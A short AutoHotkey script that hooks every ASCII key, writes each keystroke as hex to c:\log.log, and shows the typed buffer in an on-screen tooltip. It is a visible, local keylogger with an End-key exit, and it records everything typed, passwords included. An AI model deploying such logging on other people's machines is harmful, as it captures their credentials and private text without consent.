SetFormat, Integer, H
Loop, 0x7f
Hotkey, % "*~" . chr(A_Index), LogKey
SetTimer, Log2Tooltip, 10
Return

LogKey:
Key := RegExReplace(asc(SubStr(A_ThisHotkey,0)),"^0x")
Key = % Chr("0x" Key)
Key_Buffer .= Key
FileAppend, % (StrLen(Key) == 1 ? "0" : "") . Key, c:\log.log
Return

Log2Tooltip:
tooltip, Key`tKey_Buffer`n%Key%`t%Key_Buffer%
Return

~enter::
Key_Buffer .= "`r`n`t"
Return

~space::
Key_Buffer .= " "
Return

~del::
Key_Buffer := ""
Return

~backspace::
StringTrimRight, Key_Buffer, Key_Buffer, 1
Return


end::exitapp